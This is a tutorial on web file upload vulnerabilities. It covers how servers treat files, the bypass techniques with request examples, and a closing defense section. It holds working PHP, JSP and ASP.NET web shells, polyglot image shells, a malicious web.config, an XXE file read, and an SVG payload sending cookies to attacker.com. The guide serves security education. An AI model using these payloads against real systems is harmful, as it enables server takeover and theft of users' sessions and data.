# File Upload Vulnerabilities 

## Table of Contents

1. [What Are File Upload Vulnerabilities?](#1-what-are-file-upload-vulnerabilities)
2. [How Web Servers Handle Files](#2-how-web-servers-handle-files)
3. [Impact Assessment](#3-impact-assessment)
4. [Attack Techniques](#4-attack-techniques)
   - 4.1 [No Validation — Direct Web Shell Upload](#41-no-validation--direct-web-shell-upload)
   - 4.2 [Content-Type Bypass](#42-content-type-bypass)
   - 4.3 [Path Traversal via Filename](#43-path-traversal-via-filename)
   - 4.4 [Blacklist Bypass — Alternative Extensions](#44-blacklist-bypass--alternative-extensions)
   - 4.5 [Server Configuration Override (.htaccess / web.config)](#45-server-configuration-override-htaccess--webconfig)
   - 4.6 [Extension Obfuscation](#46-extension-obfuscation)
   - 4.7 [Magic Bytes / File Signature Bypass (Polyglot Files)](#47-magic-bytes--file-signature-bypass-polyglot-files)
   - 4.8 [Race Condition Bypass](#48-race-condition-bypass)
   - 4.9 [URL-Based Upload Race Conditions](#49-url-based-upload-race-conditions)
   - 4.10 [PUT Method Upload](#410-put-method-upload)
5. [Exploitation Without Remote Code Execution](#5-exploitation-without-remote-code-execution)
6. [Web Shell Reference](#6-web-shell-reference)
7. [Defense & Prevention](#7-defense--prevention)
8. [Quick Reference Cheat Sheet](#8-quick-reference-cheat-sheet)

---

## 1. What Are File Upload Vulnerabilities?

File upload vulnerabilities occur when a web server allows users to upload files without sufficiently validating their **name**, **type**, **contents**, or **size**. Even a basic image upload function can become a critical attack vector if these checks are absent or flawed.

### Simple Analogy

Imagine a building with a mail slot that accepts parcels without any screening. The building manager just assumes every parcel is legitimate. An attacker drops in a parcel containing a radio transmitter — the building staff deliver it to a shelf inside, unknowingly giving the attacker ears inside the building. File upload vulnerabilities work the same way: the server accepts and stores attacker-controlled content, then the attacker triggers its execution.

### Why These Vulnerabilities Exist

- Developers implement blacklists that are inherently incomplete — impossible to enumerate every dangerous extension
- Type checks rely on attacker-controllable metadata (Content-Type header, filename extension) rather than the actual file content
- Validation is applied inconsistently — different rules in different directories or server components
- Processing pipelines involve multiple components (proxy, app server, filesystem) that may interpret files differently
- Home-grown validation is almost always less robust than established frameworks

---

## 2. How Web Servers Handle Files

Understanding server file handling is essential to exploiting upload vulnerabilities — the server's behavior after receiving a file determines whether an attack succeeds.

### Request Flow for Static Files

```
Client Request
      │
      ▼
Server parses file extension from request path
      │
      ▼
Extension → looked up in MIME type mapping table
      │
      ├─► Non-executable (image/jpeg, text/html)
      │         → file contents served directly to client
      │
      ├─► Executable (application/x-httpd-php) + server configured to execute
      │         → script runs; HTTP request headers/params become variables
      │         → output of script sent to client (not the file itself)
      │
      └─► Executable + server NOT configured to execute
                → usually: error response
                → sometimes: file served as plain text (source code leak)
```

### Key Implication

The server's response to a file is driven by **extension → MIME type mapping**, not by what the file actually contains. This is why extension manipulation and configuration overrides are so effective — they change how the server categorizes the file, not the file itself.

---

## 3. Impact Assessment

The severity of a file upload vulnerability depends on two axes: **what the server fails to validate** and **what it does with the file after upload**.

| Validation Failure | What the Server Does | Worst Case Impact |
|-------------------|---------------------|-------------------|
| File type not validated | Executes uploaded scripts | Remote Code Execution → full server compromise |
| Filename not validated | Uses attacker's filename verbatim | Overwrites critical files; path traversal to arbitrary location |
| File size not validated | Accepts arbitrarily large files | Disk exhaustion → Denial of Service |
| File contents not validated | Trusts Content-Type header | Bypass of type restrictions |
| Execution not restricted per-directory | Executes scripts from user upload dir | RCE even with partial type validation |

### Full Compromise Chain

```
Upload web shell → Request shell URL → Execute OS commands
→ Read sensitive files (credentials, keys, source code)
→ Write new files (backdoors, cron jobs)
→ Pivot to internal network
→ Exfiltrate data
```

---

## 4. Attack Techniques

### 4.1 No Validation — Direct Web Shell Upload

**Situation:** The application accepts any file type with no restrictions.

**How it works:**

Upload a server-side script directly. The server stores it in a web-accessible directory. Requesting the file causes the server to execute it rather than serve it.

**Minimal PHP web shell (read a file):**
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

**Interactive PHP web shell (execute any command):**
```php
<?php echo system($_GET['command']); ?>
```

**Usage after upload:**
```
GET /files/avatars/exploit.php?command=id HTTP/1.1
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Key principle:** The upload function only needs to store the file somewhere web-accessible. The second request — the GET to trigger execution — is what delivers the impact.

---

### 4.2 Content-Type Bypass

**Situation:** The server validates the `Content-Type` header in the multipart upload request but does not verify the actual file contents.

**How multipart/form-data uploads look on the wire:**

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg          ← this is attacker-controlled

<?php echo system($_GET['command']); ?>
------WebKitFormBoundary--
```

**Attack:** Change the `Content-Type` of the file part in the multipart body from `application/x-php` (or whatever was auto-set) to `image/jpeg` or `image/png`. The server checks the header value and sees a permitted type — it never inspects whether the bytes match a real image.

```
Content-Type: image/jpeg    ← server sees: allowed
                            ← server does not check: is this really JPEG bytes?
```

**Why it works:** The `Content-Type` header within a multipart part is user-supplied. It is not derived from the file — it is whatever the client sends. Trusting it without verifying actual file content is the flaw.

---

### 4.3 Path Traversal via Filename

**Situation:** The server restricts script execution in the upload directory but executes scripts from other directories. The server uses the `filename` field in the multipart request to determine where to save the file.

**Normal upload:**
```
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
→ saved to: /var/www/uploads/avatars/photo.jpg  (no execution)
```

**Traversal attempt:**
```
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
→ server should save to: /var/www/uploads/avatars/../exploit.php
→ resolves to: /var/www/uploads/exploit.php    (may execute)
```

**If the server strips `../`:** URL-encode the slash:
```
filename="..%2fexploit.php"
```

The server's path-stripping logic sees no `../` (it looks for the literal characters). After saving, the server decodes the URL-encoded character when constructing the filesystem path — landing the file one directory above the upload folder.

**Confirmation indicator:** Response message will show the resolved path:
```
The file avatars/../exploit.php has been uploaded.
→ indicates traversal worked; file is at /files/exploit.php
```

---

### 4.4 Blacklist Bypass — Alternative Extensions

**Situation:** The server blocks common dangerous extensions (`.php`, `.jsp`, `.asp`) but does not block lesser-known alternatives that the server still executes.

**Alternative executable extensions by platform:**

| Platform | Blocked (usually) | Alternatives to try |
|----------|--------------------|---------------------|
| PHP/Apache | `.php` | `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phtml`, `.shtml` |
| PHP/Apache | `.php` | `.pHp`, `.PhP`, `.PHP` (case sensitivity in blacklist) |
| ASP.NET/IIS | `.asp`, `.aspx` | `.ashx`, `.asmx`, `.axd`, `.cshtml` |
| JSP/Tomcat | `.jsp` | `.jspx`, `.jsw`, `.jsv` |
| CGI/Apache | `.cgi` | `.pl`, `.py`, `.rb` |

**Why it works:** Blacklists enumerate known bad extensions. Any extension the developer forgot to include is a bypass. The mapping of extension to executable MIME type happens in server configuration — if `.phtml` maps to `application/x-httpd-php`, it executes just like `.php`.

---

### 4.5 Server Configuration Override (.htaccess / web.config)

**Situation:** The server blocks all known PHP extensions, but allows upload of arbitrary file types including configuration files. The server processes per-directory configuration files.

**Apache — `.htaccess` attack:**

1. Upload a `.htaccess` file with contents that map a custom extension to an executable MIME type:

```apache
AddType application/x-httpd-php .l33t
```

2. Now upload the web shell with the custom extension:

```
filename="exploit.l33t"
```

3. The server reads `.htaccess`, sees `.l33t` → PHP, executes the shell.

**IIS — `web.config` attack:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

**Why it works:** Per-directory configuration files are processed by the server before it handles requests in that directory. If an attacker can upload a `.htaccess` or `web.config`, they effectively control server behavior for that entire directory — including what file types get executed.

> **Check first:** Send an `OPTIONS` request to the upload directory. The response may reveal what methods are allowed and whether the server is Apache or IIS, which determines which config file to target.

---

### 4.6 Extension Obfuscation

**Situation:** The server has a blacklist and strips or rejects files matching dangerous extensions. The blacklist check is imperfect.

**Technique 1 — Case variation (case-sensitive blacklist):**
```
exploit.pHp
exploit.PhP
exploit.PHP
```

**Technique 2 — Multiple extensions (ambiguous parsing):**
```
exploit.php.jpg
exploit.php.png
```
Some parsers take the last extension; others take the first. If validation takes the last (`.jpg` → allowed) but execution maps the first (`.php` → execute), the check is bypassed.

**Technique 3 — Trailing characters (stripped before storage):**
```
exploit.php.
exploit.php%20
exploit.php%09
```
Validation may strip trailing dots/spaces and then use the stripped filename for the blacklist check — but save the original. Or strip and use the original for saving, matching against the stripped name.

**Technique 4 — URL encoding of the dot:**
```
exploit%2Ephp
```
Validation checks the URL-decoded form if it decodes before checking; or misses it if it checks before decoding but decodes before saving.

**Technique 5 — Null byte injection:**
```
exploit.php%00.jpg
exploit.asp;.jpg
```
The validation sees `.jpg` (everything after `%00` or `;`). The filesystem or server runtime sees `exploit.php` because it treats null bytes or semicolons as string terminators.

**Technique 6 — Nested dangerous extension (non-recursive strip):**
```
exploit.p.phphp
```
Stripping `.php` once produces: `exploit.p.hp` — still potentially dangerous or further exploitable.

**Technique 7 — Unicode/multibyte obfuscation:**
```
exploit.phpX  (where X is a unicode dot lookalike)
```
Unicode normalization may convert the character to `.` after the blacklist check passes.

---

### 4.7 Magic Bytes / File Signature Bypass (Polyglot Files)

**Situation:** The server verifies that the file contents match the claimed type by checking the **magic bytes** (file signature) at the start of the file — not just the extension or Content-Type header.

**Common magic bytes:**

| Format | Magic Bytes (hex) | ASCII |
|--------|-------------------|-------|
| JPEG | `FF D8 FF` | `ÿØÿ` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF | `47 49 46 38` | `GIF8` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

**Attack — Prepend valid magic bytes:**

The simplest approach: prepend the JPEG magic bytes before the PHP payload.

```
FF D8 FF <?php echo system($_GET['cmd']); ?>
```

The magic byte check passes (first bytes match JPEG). The PHP interpreter ignores leading binary garbage and executes the PHP tag.

**Attack — Polyglot using image metadata:**

Embed PHP payload inside legitimate image metadata (EXIF fields). The file is a valid JPEG that passes structural image checks, but the PHP payload lives in a comment or EXIF field that PHP will execute when processed.

```bash
exiftool -Comment="<?php echo system(\$_GET['cmd']); ?>" input.jpg -o polyglot.php
```

The resulting `polyglot.php` passes image dimension and magic byte checks because it is a real JPEG. When the server executes it as PHP, the engine finds and runs the payload in the comment field.

**Why it works:** Content validation checks that the file looks like an image. PHP doesn't care what comes before `<?php` — it just finds the opening tag and starts executing.

> **Confirmation:** After upload, look for the payload output in the response. The binary JPEG data will surround it — search for your output string (e.g. `START ... END`) within the binary response body.

---

### 4.8 Race Condition Bypass

**Situation:** The server performs validation **after** storing the file (e.g. antivirus scanning) rather than before. It deletes the file if it fails validation. There is a window between storage and deletion during which the file is accessible and executable.

**Timeline of the vulnerable flow:**

```
POST /upload (exploit.php)
        │
        ▼
File written to web-accessible path   ← window opens here
        │
        ▼
Validation / AV scan runs
        │
        ▼
Validation fails → file deleted       ← window closes here

   GET /files/avatars/exploit.php
        ↑
   Must arrive during the window
```

**Attack:**

Send the upload POST and multiple GET requests to the file simultaneously. At least one GET should hit during the window between write and delete.

```
→ POST /my-account/avatar (exploit.php)
→ GET /files/avatars/exploit.php   ←─┐
→ GET /files/avatars/exploit.php      │  Fire these concurrently
→ GET /files/avatars/exploit.php   ←─┘
→ GET /files/avatars/exploit.php
→ GET /files/avatars/exploit.php
```

The window may be only a few milliseconds. Use concurrent connections and a high volume of GET requests to maximize the probability of hitting it.

**Framework-based mitigations and their limits:**

Modern frameworks upload to a **randomized temporary directory** before validation. Even with this protection, if the temporary directory name uses a weak pseudo-random function (e.g. PHP's `uniqid()` based on system time), the directory name can be brute-forced — especially if the validation step extends the window (e.g. uploading a large file processed in chunks with the malicious payload at the start).

---

### 4.9 URL-Based Upload Race Conditions

**Situation:** The application allows uploading a file by providing a URL. The server fetches the file remotely and stores a local copy, then validates it.

**Why it's different:** The server fetches via HTTP, creating a time window during which:
- The file exists on the server but hasn't been validated
- If the temporary directory name is guessable or predictable, the file can be requested before deletion

**Extending the race window:**

Upload a large file. If processed in chunks, processing time increases proportionally. Place the malicious payload at the start of the file so it executes regardless of how many chunks are processed before validation fires.

---

### 4.10 PUT Method Upload

**Situation:** The web server is configured to accept `PUT` requests, allowing direct file creation on the filesystem without using an upload form.

**Attack:**

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

If the server accepts the request, the file is created directly at the specified path. If that path is web-accessible and the server executes PHP, it's an instant web shell.

**Discovery:**

```http
OPTIONS /images/ HTTP/1.1
Host: vulnerable-website.com
```

If the response includes `Allow: GET, POST, PUT`, the PUT method is enabled. Try different directories — PUT may be enabled in some but not all paths.

---

## 5. Exploitation Without Remote Code Execution

Not all file upload vulnerabilities lead directly to RCE. Other impact paths:

### Stored XSS via Uploaded Files

If the application serves HTML, SVG, or JavaScript files uploaded by users, those files can contain `<script>` tags that execute in other users' browsers.

```html
<!-- exploit.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://attacker.com/?c='+document.cookie</script>
</svg>
```

**Condition:** The file must be served from the same origin as the target application. Same-origin policy prevents scripts loaded from a different domain from accessing cookies/sessions of the main domain.

### XXE Injection via Uploaded XML-Based Files

If the server parses XML-based file formats (`.docx`, `.xlsx`, `.svg`, `.pptx`), those files can contain malicious XML entity declarations that trigger server-side file reads or network requests.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Office documents (`.docx`, `.xlsx`) are ZIP archives containing XML. Modify the XML internals, repackage as a valid Office file, and upload.

### File Overwrite

If the server preserves the original filename without sanitization, upload a file named the same as a critical existing file:

```
filename="config.php"
filename=".htaccess"
filename="index.php"
```

If path traversal is also possible, target files outside the upload directory.

### Denial of Service via Size

If file size is not validated, upload files of enormous size to exhaust disk space.

---

## 6. Web Shell Reference

### PHP

```php
# Read a specific file
<?php echo file_get_contents('/etc/passwd'); ?>

# Execute arbitrary OS commands via query parameter
<?php echo system($_GET['cmd']); ?>

# More robust command execution
<?php echo shell_exec($_GET['cmd']); ?>

# File read + write capable shell
<?php
if(isset($_GET['cmd'])) { echo system($_GET['cmd']); }
if(isset($_POST['upload'])) { file_put_contents($_POST['filename'], $_POST['content']); }
?>
```

**Usage:**
```
GET /shell.php?cmd=whoami
GET /shell.php?cmd=cat+/etc/passwd
GET /shell.php?cmd=ls+-la+/var/www/html
```

### JSP (Java Server Pages)

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
int a = -1;
byte[] b = new byte[65536];
out.print("<pre>");
while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); }
out.print("</pre>");
%>
```

### ASP.NET

```asp
<%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll())%>
```

---

## 7. Defense & Prevention

### 1. Whitelist File Extensions (Not Blacklist)

Blacklists must explicitly enumerate every dangerous extension — impossible to maintain. Whitelists define exactly what is allowed. Anything not in the list is rejected.

```python
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}

def allowed_file(filename):
    ext = os.path.splitext(filename)[1].lower()
    return ext in ALLOWED_EXTENSIONS
```

**Why whitelist wins:** An attacker who finds `.phtml` or `.php7` bypasses any blacklist. A whitelist that only allows `.jpg` and `.png` blocks every PHP variant by design.

### 2. Validate Actual File Contents (Magic Bytes + Structure)

Do not rely on the `Content-Type` header or file extension alone. Inspect the actual bytes.

```python
import imghdr

def is_real_image(file_bytes):
    img_type = imghdr.what(None, h=file_bytes)
    return img_type in ('jpeg', 'png', 'gif')
```

For stronger validation, use a dedicated library that fully parses the file format (Pillow for images, pdfminer for PDFs). A file that cannot be successfully parsed by the format library is not that format.

### 3. Rename Files on Upload — Never Use the Original Filename

The original filename is attacker-controlled. Use it for nothing except possibly sanitized display. Store files with server-generated names.

```python
import uuid, os

def save_file(file, upload_dir):
    ext = os.path.splitext(file.filename)[1].lower()
    safe_name = str(uuid.uuid4()) + ext    # e.g. a3f2e1b0-....jpg
    file.save(os.path.join(upload_dir, safe_name))
    return safe_name
```

This prevents: filename-based path traversal, overwriting existing files, and MIME type manipulation via filename.

### 4. Prevent Directory Traversal in Filenames

Strip or reject any path separators or traversal sequences from the filename before using it.

```python
import os

def sanitize_filename(filename):
    # Take only the basename — no path components
    filename = os.path.basename(filename)
    # Reject if still contains suspicious characters
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValueError("Invalid filename")
    return filename
```

### 5. Prevent Script Execution in Upload Directories

Configure the web server to serve files from upload directories as static content only — never execute them.

**Apache — disable execution in upload directory:**
```apache
<Directory "/var/www/uploads">
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .php .php5 .phtml .jsp .asp .aspx
</Directory>
```

**Nginx — serve uploads as static only:**
```nginx
location /uploads/ {
    # Disable PHP processing
    location ~ \.php$ {
        return 403;
    }
}
```

This means even if a shell is successfully uploaded, requesting it returns plain text (source code) rather than executing it — removing the second step of the attack.

### 6. Store Files Outside the Web Root

If uploaded files are stored in a directory not served by the web server, they cannot be directly requested via HTTP regardless of their content.

```
Web root:     /var/www/html/        ← web server serves this
Upload store: /var/uploads/          ← outside web root; not directly accessible

Application reads files from /var/uploads/ and streams them to the response.
```

The application becomes the only way to access files — it controls what is served and how.

### 7. Validate File Size

Set maximum file size limits at both the application level and the web server level to prevent disk exhaustion.

```python
MAX_UPLOAD_SIZE = 5 * 1024 * 1024  # 5MB

if len(file_bytes) > MAX_UPLOAD_SIZE:
    raise ValueError("File too large")
```

**Nginx:**
```nginx
client_max_body_size 5M;
```

### 8. Use Established Frameworks for Upload Handling

Purpose-built file upload libraries handle edge cases that are easy to miss in custom implementations — multipart parsing edge cases, encoding tricks, partial uploads. Use them in preference to writing validation from scratch.

### 9. Defense in Depth — Layer Multiple Controls

No single control is sufficient. Apply all of the above together:

```
Upload request
      │
      ▼
Size check (reject if too large)
      │
      ▼
Extension whitelist (reject if not .jpg/.png/etc.)
      │
      ▼
Content-Type validation (informational — do not trust alone)
      │
      ▼
Magic byte + structural validation (does it actually parse as an image?)
      │
      ▼
Filename sanitized → UUID assigned
      │
      ▼
Stored outside web root OR in no-execute directory
      │
      ▼
Served only through application (not directly via URL)
```

---

## 8. Quick Reference Cheat Sheet

### Signs an Upload Function May Be Vulnerable

- The stored file is directly accessible at a predictable URL (e.g. `/uploads/yourfilename.jpg`)
- The response to upload reflects the original filename back unchanged
- File content type is not verified server-side (only Content-Type header is checked)
- Error messages reveal the server type and upload directory path
- The server is Apache and accepts `.htaccess` uploads
- The server is IIS and accepts `web.config` uploads
- OPTIONS request on the upload endpoint returns `PUT` as an allowed method
- Different file extensions are accepted in different directories

### Bypass Technique Progression (Try in Order)

```
1. Upload .php directly                          → no validation at all
2. Change Content-Type to image/jpeg             → MIME type header bypass
3. Try .php5, .phtml, .shtml                     → blacklist alternative extensions
4. Try .pHp, .PHP                               → case sensitivity bypass
5. Try exploit.php.jpg                           → multi-extension bypass
6. Try exploit.php%00.jpg                        → null byte bypass
7. Try exploit.php.                              → trailing dot bypass
8. Upload .htaccess mapping .l33t → PHP, then upload exploit.l33t → config override
9. Use filename="../exploit.php" or "..%2fexploit.php" → path traversal bypass
10. Prepend JPEG magic bytes FF D8 FF to PHP payload → magic byte bypass
11. Use exiftool to embed payload in EXIF metadata → polyglot file bypass
12. Race upload POST with repeated GETs           → race condition bypass
13. PUT /path/exploit.php                         → PUT method upload
```

### Web Shell Payloads (PHP)

```php
# Read file
<?php echo file_get_contents('/etc/passwd'); ?>

# Command execution (query param)
<?php echo system($_GET['cmd']); ?>

# Command execution (POST param)
<?php echo system($_POST['cmd']); ?>
```

### Extension Obfuscation Quick Reference

| Technique | Example |
|-----------|---------|
| Alternative extension | `exploit.php5`, `exploit.phtml` |
| Case variation | `exploit.pHp`, `exploit.PHP` |
| Multi-extension | `exploit.php.jpg` |
| Trailing dot | `exploit.php.` |
| Null byte | `exploit.php%00.jpg` |
| URL-encoded dot | `exploit%2Ephp` |
| Nested strip bypass | `exploit.p.phphp` |

### Magic Bytes Quick Reference

| Format | Hex | Use in bypass |
|--------|-----|--------------|
| JPEG | `FF D8 FF` | Prepend to PHP payload |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | Prepend to payload |
| GIF | `47 49 46 38 39 61` | `GIF89a<?php system($_GET['cmd']); ?>` |
| PDF | `25 50 44 46 2D` | Prepend to payload |

**GIF polyglot one-liner:**
```
GIF89a<?php echo system($_GET['cmd']); ?>
```
This is a valid GIF header followed immediately by PHP. Passes `image/gif` magic byte checks; PHP engine executes the embedded tag.

### Server Configuration File Targets

| Server | Config File | What to Upload |
|--------|------------|----------------|
| Apache | `.htaccess` | `AddType application/x-httpd-php .customext` |
| IIS | `web.config` | Handler mapping for custom extension to ISAPI/ASP |
| Nginx | N/A | Nginx does not support per-directory config files |

### Exploitation Without RCE

| Technique | Condition | Impact |
|-----------|-----------|--------|
| Stored XSS | HTML/SVG served from same origin | Session hijacking, credential theft |
| XXE Injection | Server parses uploaded XML/Office files | File read, SSRF |
| File Overwrite | Filename not sanitized | Overwrite config/code files |
| DoS | Size not validated | Disk exhaustion |